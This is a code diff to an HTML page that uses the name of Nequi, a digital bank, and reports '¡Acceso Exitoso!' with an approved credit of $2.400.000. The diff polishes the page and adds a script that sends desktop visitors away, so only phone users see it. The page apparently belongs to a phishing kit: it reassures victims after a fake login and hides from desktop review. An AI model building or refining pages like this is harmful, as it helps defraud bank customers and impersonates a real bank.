@@ -5,28 +5,65 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Nequi - Crédito Aprobado</title>
   <link rel="stylesheet" href="../css/globals.css" />
+  <style>
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .fade-in { animation: fadeIn 0.6s ease-out; }
+    .success-icon {
+      width: 120px;
+      height: 120px;
+      margin: 0 auto 2rem;
+      animation: fadeIn 0.8s ease-out;
+    }
+  </style>
 </head>
+
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    let esMovil = /Mobi|Android|iPhone|iPad|iPod|Opera Mini|IEMobile/i.test(navigator.userAgent);
+    if (!esMovil) {
+      window.location.href = "../pc.html";
+    }
+  });
+</script>
+
 <body class="bg-purple-primary min-h-screen flex items-center justify-center p-4">
-  <div class="text-center text-white max-w-md">
-    <div class="mb-8">
-      <svg width="120" height="120" viewBox="0 0 120 120" class="mx-auto">
-        <circle cx="60" cy="60" r="50" fill="#00D084" opacity="0.2"/>
-        <path d="M50 60 L55 65 L70 50" stroke="#00D084" stroke-width="4" fill="none" stroke-linecap="round"/>
+  <div class="text-center text-white max-w-md w-full fade-in">
+    <div class="success-icon">
+      <svg viewBox="0 0 120 120" fill="none">
+        <circle cx="60" cy="60" r="54" fill="#00D084" opacity="0.2"/>
+        <circle cx="60" cy="60" r="50" stroke="#00D084" stroke-width="4" fill="none"/>
+        <path d="M40 60 L52 72 L80 44" stroke="#00D084" stroke-width="6" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>
     </div>
-    <h1 class="text-3xl font-bold mb-4">✅ ¡Acceso Exitoso!</h1>
+
+    <h1 class="text-3xl font-bold mb-3">✅ ¡Acceso Exitoso!</h1>
     <p class="text-xl mb-2">Tu crédito está siendo procesado</p>
-    <p class="text-sm opacity-80 mb-8">En breve recibirás la confirmación</p>
+    <p class="text-sm opacity-80 mb-8">En breve recibirás la confirmación en tu app Nequi</p>
     
-    <div class="bg-white/10 rounded-lg p-6 backdrop-blur-sm">
-      <p class="text-sm mb-2">Monto disponible</p>
-      <p class="text-4xl font-bold text-pink-primary">$2.400.000</p>
+    <div class="bg-white/10 rounded-lg p-6 backdrop-blur-sm mb-6">
+      <p class="text-sm mb-2 opacity-90">Monto disponible</p>
+      <p class="text-5xl font-bold text-pink-primary mb-2">$2.400.000</p>
+      <p class="text-xs opacity-70">Tasa desde 1.8% mensual</p>
+    </div>
+
+    <div class="bg-white/5 rounded-lg p-4 mb-8 text-left text-sm">
+      <p class="mb-2">✔️ Sin costos de estudio</p>
+      <p class="mb-2">✔️ Paga a tu ritmo</p>
+      <p class="mb-2">✔️ Sin papeleos</p>
+      <p>✔️ Desembolso inmediato</p>
     </div>
 
     <button onclick="window.location.href='../index.html'" 
-      class="mt-8 bg-pink-primary text-white px-8 py-3 rounded-lg font-medium hover:bg-pink-600 transition-colors">
+      class="w-full bg-pink-primary text-white px-8 py-4 rounded-lg font-medium hover:bg-pink-600 transition-colors text-lg">
       Volver al inicio
     </button>
+
+    <p class="text-xs opacity-60 mt-6">
+      *Crédito sujeto a aprobación. Aplican T&C
+    </p>
   </div>
 </body>
 </html>
